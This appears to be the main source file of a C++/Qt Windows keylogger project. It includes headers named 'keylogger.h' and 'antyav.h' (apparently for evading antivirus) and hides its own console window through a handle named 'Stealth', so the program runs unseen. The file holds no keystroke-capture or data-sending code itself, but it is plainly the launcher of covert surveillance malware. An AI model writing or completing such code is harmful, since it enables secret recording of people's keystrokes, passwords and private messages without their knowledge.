#include <QCoreApplication>

#include <cstdlib>
#include <windows.h>
#include <iostream>

#include "antyav.h"
#include "application.h"
#include "keylogger.h"
#include "log.h"
#include "timelog.h"
#include "window.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
    return a.exec();
}
